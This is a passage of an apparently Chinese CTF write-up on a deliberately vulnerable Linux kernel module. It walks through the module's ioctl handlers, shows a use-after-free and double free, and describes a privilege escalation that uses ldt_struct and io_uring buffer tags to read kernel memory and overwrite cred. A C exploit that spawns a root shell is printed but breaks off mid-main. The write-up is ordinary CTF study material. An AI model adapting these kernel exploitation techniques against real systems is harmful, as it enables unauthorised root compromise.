<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span>   <span class="title function_">hhoge_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span>   __user *ubuf,   <span class="type">size_t</span></span></span><br><span class="line"><span class="params">size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Maind</span>* <span class="title">context</span> =</span> file-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (context!=<span class="literal">NULL</span> &amp;&amp; context-&gt;cur != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		copy_to_user(ubuf,(<span class="type">const</span> <span class="type">void</span> *)&amp;(((<span class="keyword">struct</span> Options*)context-&gt;cur)-&gt;magic),size&gt;<span class="number">9</span>? <span class="number">9</span>:size);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中具体读取的为 private_data 中的 cur 指针，该指针被强制转换为 Options 结构体，定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Options</span>&#123;</span></span><br><span class="line">	<span class="type">char</span> *magic;</span><br><span class="line">	<span class="type">char</span> *fortune;</span><br><span class="line">	<span class="type">long</span> money;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>即将 private_data-&gt;cur-&gt;magic 读取到最多9字节到用户空间。分析后面 change 函数可知 magic 字段代表一个对象指针，即可以读堆上地址。</p>
<h3 id="hhoge-release-函数"><a href="#hhoge-release-函数" class="headerlink" title="hhoge_release 函数"></a>hhoge_release 函数</h3><p>简单清空 file-&gt;private_data 内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hhoge_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hhoge-unlocked-ioctl-函数"><a href="#hhoge-unlocked-ioctl-函数" class="headerlink" title="hhoge_unlocked_ioctl 函数"></a>hhoge_unlocked_ioctl 函数</h3><p>定义了多个命令操作，感觉类似堆菜单的增删改查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">hhoge_unlocked_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file,   <span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span>   <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Maind</span>* <span class="title">context</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="keyword">if</span>(context==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Options</span>* <span class="title">opts</span>;</span></span><br><span class="line">	<span class="type">char</span> tmp[<span class="number">0x20</span>];</span><br><span class="line">	copy_from_user(tmp,arg,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">	<span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			printk(<span class="string">&quot;born&quot;</span>);</span><br><span class="line">			opts = (<span class="keyword">struct</span> Options*)kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Options),GFP_KERNEL);</span><br><span class="line">			context-&gt;cur = (<span class="keyword">struct</span> Options*)opts;</span><br><span class="line">			((<span class="keyword">struct</span> Options*)context-&gt;cur)-&gt;fortune = <span class="string">&quot;ordinary&quot;</span>;</span><br><span class="line">			context-&gt;id = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">memcpy</span>(context-&gt;username,tmp,<span class="number">0x20</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			reborn(context);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">114</span>:</span><br><span class="line">			change(context,tmp);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">			delMaind(context);</span><br><span class="line">			file-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="born"><a href="#born" class="headerlink" title="born"></a>born</h4><p>生成一个 Options 并将其赋值给 file-&gt;private_data-&gt;cur, 并将 arg 数据写入到 file-&gt;private_data-&gt;username</p>
<h4 id="reborn"><a href="#reborn" class="headerlink" title="reborn"></a>reborn</h4><p>将 file-&gt;private_data-&gt;cur 拷贝到 file-&gt;private_data-&gt;prv ，并给 cur 写入 fortune &#x3D; “unlucky”; money &#x3D; -114514; id++</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reborn</span><span class="params">(<span class="keyword">struct</span> Maind* context)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Options</span>* <span class="title">new_opts</span> ;</span></span><br><span class="line">	<span class="keyword">if</span>(context == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	printk(<span class="string">&quot;reborn&quot;</span>);</span><br><span class="line">	new_opts = (<span class="keyword">struct</span> Options*)kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Options),GFP_KERNEL);</span><br><span class="line">	context-&gt;prv = (<span class="type">void</span>*)new_opts;</span><br><span class="line">	<span class="built_in">memcpy</span>(context-&gt;prv,context-&gt;cur,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Options));</span><br><span class="line">	((<span class="keyword">struct</span> Options*)context-&gt;cur)-&gt;fortune = <span class="string">&quot;unlucky&quot;</span>;</span><br><span class="line">	((<span class="keyword">struct</span> Options*)context-&gt;cur)-&gt;money = <span class="number">-114514</span>;</span><br><span class="line">	context-&gt;id++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="change"><a href="#change" class="headerlink" title="change"></a>change</h4><p>修改内容，应该是要传入 <code>key1=data1,key2=...</code> 格式的字符串。<br>检查逻辑包括 key 不能为空，value 长度不能超过 9，然后根据 key 内容将 value 赋值给 opts 的不同字段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">lookup</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*key)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">-1</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> **p;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (p = key_list; *p!=<span class="literal">NULL</span>; p++,j++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(*p, key) == <span class="number">0</span>)&#123;</span><br><span class="line">			i = j;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_string</span><span class="params">(<span class="keyword">struct</span> Maind*context,<span class="type">const</span> <span class="type">char</span>*key,<span class="type">const</span> <span class="type">char</span>*value, <span class="type">size_t</span> v_size)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Options</span> *<span class="title">opts</span> =</span> context-&gt;cur;</span><br><span class="line">	<span class="type">char</span> *<span class="built_in">string</span>;</span><br><span class="line">	<span class="type">int</span> opt = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (!opts)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (value) &#123;</span><br><span class="line">		<span class="built_in">string</span> = kmemdup_nul(value, v_size, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">string</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	opt = lookup(key);</span><br><span class="line">	<span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			kfree(opts-&gt;magic);</span><br><span class="line">			opts-&gt;magic = <span class="built_in">string</span>;</span><br><span class="line">			<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			opts-&gt;fortune = <span class="string">&quot;lucky&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			opts-&gt;money += (<span class="type">long</span>)<span class="built_in">string</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	kfree(<span class="built_in">string</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="keyword">struct</span> Maind*context,<span class="type">char</span>*arg)</span>&#123;</span><br><span class="line">	<span class="type">char</span> *options = arg, *key;</span><br><span class="line">	<span class="keyword">if</span> (!options)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	printk(<span class="string">&quot;change&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> ((key = strsep(&amp;options, <span class="string">&quot;,&quot;</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (*key) &#123;</span><br><span class="line">			<span class="type">size_t</span> v_len = <span class="number">0</span>;</span><br><span class="line">			<span class="type">char</span> *value = <span class="built_in">strchr</span>(key, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">			<span class="keyword">if</span> (value) &#123;</span><br><span class="line">				<span class="keyword">if</span> (value == key)</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				*value++ = <span class="number">0</span>;</span><br><span class="line">				v_len = <span class="built_in">strlen</span>(value);</span><br><span class="line">				<span class="keyword">if</span> (v_len &gt; <span class="number">9</span>)</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">int</span> ret = parse_string(context,key, value, v_len);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>key 的可能取值定义在 key_list中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* key_list[] = &#123;</span><br><span class="line">	<span class="string">&quot;flag&quot;</span>,</span><br><span class="line">	<span class="string">&quot;fortune&quot;</span>,</span><br><span class="line">	<span class="string">&quot;money&quot;</span>,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以发现如果 change 在设置了 opts-&gt;magic &#x3D; string 后再进行 reborn 复制到 prv 就可以实现 prv 和 cur 同时指向分配的对象，如果再 change magic 分配一次就可以实现 prv-&gt;magic 的 UAF，同时可以 free prv-&gt;magic 从而实现 double free。</p>
<h4 id="delMaind"><a href="#delMaind" class="headerlink" title="delMaind"></a>delMaind</h4><p>释放 file-&gt;private_data-&gt;cur 以及 prv 指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delMaind</span><span class="params">(<span class="keyword">struct</span> Maind* context)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Options</span>* <span class="title">cur</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Options</span>* <span class="title">prv</span>;</span></span><br><span class="line">	<span class="keyword">if</span>(context == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	printk(<span class="string">&quot;die\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	cur = (<span class="keyword">struct</span> Options*)context-&gt;cur;</span><br><span class="line">	prv = (<span class="keyword">struct</span> Options*)context-&gt;prv;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (cur!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		kfree(cur-&gt;magic);</span><br><span class="line">		cur-&gt;magic = <span class="literal">NULL</span>;</span><br><span class="line">		kfree(cur);</span><br><span class="line">		context-&gt;cur = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (prv!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		kfree(prv-&gt;magic);</span><br><span class="line">		prv-&gt;magic = <span class="literal">NULL</span>;</span><br><span class="line">		kfree(prv);</span><br><span class="line">		context-&gt;prv = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kfree(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于存在 UAF 以及 Double Free 漏洞，string 对象大小最大为 9，对应 kmalloc-16, 需要合适的可利用的结构体来作 UAF。<br>满足大小条件的结构体只有 ldt_struct 以及可以任意分配大小的结构体，因此这里采用利用 ldt_struct 以及 io_uring 来进行利用。<br>首先利用 double free漏洞同时申请到 io_uring-&gt;buf_data-&gt;tags 以及 ldt_struct 可以随意更新内容机制以及 read 可以泄漏堆地址配合 modify_ldt 实现任意地址读，在堆内存空间中搜索 <code>task_struct</code> 结构体，进而获得 cred 地址。这里需要注意新版本的 task_struct 在这一片区域有一点变化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<p>comm 与 cred 之间多了一个指针。<br>然后释放 ldt 结构体，让 io_uring 的 table 分配大小为0x10（ring0），使 table 占据这个 UAF 的堆块。然后可以分配两个 ring，可以通过 ring0 的 ctx-&gt;buf_data-&gt;tag[0] 即 table[0] 修改 ring1 的 table 为 cred 地址，进而修改 table 即可实现修改 cred 的目的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">ldt(ring0-&gt;</span><span class="language-bash">tags[0]) -(free ldt &amp; alloc ring1-&gt;tags)</span></span><br><span class="line"><span class="meta prompt_">ring1-&gt;</span><span class="language-bash">tags</span> </span><br></pre></td></tr></table></figure>
<p>exp 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;liburing.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessNUM  0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UringNUM 0x20</span></span><br><span class="line"><span class="type">pid_t</span> processes[ProcessNUM];</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ID__ <span class="string">&quot;wawwwwww&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>, <span class="title">ring1</span>, <span class="title">ring2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span>   entries;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr_entries;</span><br><span class="line">    <span class="type">int</span>         slot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_uring</span><span class="params">()</span>&#123;</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>,&amp;ring, <span class="number">0</span>);</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>,&amp;ring1,<span class="number">0</span>);</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>,&amp;ring2,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_tag</span><span class="params">(<span class="keyword">struct</span> io_uring *ring,<span class="type">size_t</span> *data,<span class="type">int</span> num)</span>&#123;</span><br><span class="line">    <span class="type">char</span> tmp_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[<span class="title">num</span>];</span></span><br><span class="line">    <span class="type">size_t</span> tags[num];</span><br><span class="line">    <span class="built_in">memcpy</span>(tags,data,num*<span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        vecs[i].iov_base = tmp_buf;</span><br><span class="line">        vecs[i].iov_len = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//io_alloc_page_table</span></span><br><span class="line">    <span class="type">int</span> res = io_uring_register_buffers_tags(ring,vecs,(__u64 *)tags,num);<span class="comment">//kcalloc(nr_tables, sizeof(*table), GFP_KERNEL_ACCOUNT);</span></span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>,res);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update_tag</span><span class="params">(<span class="keyword">struct</span> io_uring *ring,<span class="type">size_t</span> Data,<span class="type">int</span> num)</span>&#123;</span><br><span class="line">    <span class="type">char</span> tmp_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[2];</span></span><br><span class="line">    vecs[<span class="number">0</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">0</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="number">0</span>,vecs,(__u64 *)Data,num);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>,ret);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spawn_processes</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ProcessNUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">pid_t</span> child = fork();</span><br><span class="line">        <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prctl(PR_SET_NAME, __ID__, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;Could not set name&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">uid_t</span> old = getuid();</span><br><span class="line">            kill(getpid(), SIGSTOP);</span><br><span class="line">            <span class="type">uid_t</span> uid = getuid();</span><br><span class="line">            <span class="keyword">if</span> (uid == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Enjoy root!&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(uid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (child &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> child;</span><br><span class="line">        &#125;</span><br><span class="line">        processes[i] = child;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_cred</span><span class="params">(<span class="type">size_t</span> heap)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[PAGESIZE];</span><br><span class="line">    <span class="type">size_t</span> *result_addr;</span><br><span class="line">    <span class="type">size_t</span> cred_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> res = pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span>(res)</span><br><span class="line">        errExit(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    heap = (heap/<span class="number">0x1000</span>)*<span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGESIZE*PAGESIZE ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i &amp;&amp; (i % <span class="number">0x100</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;looked up range from %p ~ %p\n&quot;</span>,heap - i * PAGESIZE,heap + i * PAGESIZE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Forward search</span></span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,PAGESIZE);</span><br><span class="line">        ldt.entries = heap - i * PAGESIZE;</span><br><span class="line">        ldt.nr_entries = PAGESIZE/<span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring,(<span class="type">size_t</span>)&amp;ldt,<span class="number">2</span>);<span class="comment">//Setting the search Address</span></span><br><span class="line">        <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">            <span class="type">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, PAGESIZE);</span><br><span class="line">            <span class="keyword">if</span>(res == PAGESIZE)&#123;</span><br><span class="line">                result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x1000</span>, __ID__, <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span> (result_addr)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="number">-2</span>]);</span><br><span class="line">                    cred_addr = result_addr[<span class="number">-2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (cred_addr != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//Search backwards</span></span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,PAGESIZE);</span><br><span class="line">        ldt.entries = heap + i * PAGESIZE;</span><br><span class="line">        ldt.nr_entries = PAGESIZE/<span class="number">8</span>;</span><br><span class="line">        update_tag(&amp;ring,(<span class="type">size_t</span>)&amp;ldt,<span class="number">2</span>);<span class="comment">//Setting the search Address</span></span><br><span class="line">        <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">            <span class="type">int</span> res = syscall(SYS_modify_ldt, <span class="number">0</span>, buf, PAGESIZE);</span><br><span class="line">            <span class="keyword">if</span>(res == PAGESIZE)&#123;</span><br><span class="line">                result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x1000</span>, __ID__, <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span> (result_addr)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m0x%lx\n&quot;</span>, result_addr[<span class="number">-2</span>]);</span><br><span class="line">                    cred_addr = result_addr[<span class="number">-2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (cred_addr != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cred_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spawn_root_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ProcessNUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        kill(processes[i], SIGCONT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(wait(<span class="literal">NULL</span>) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span> leak_heap,cred;</span><br><span class="line">    <span class="type">size_t</span> Data[<span 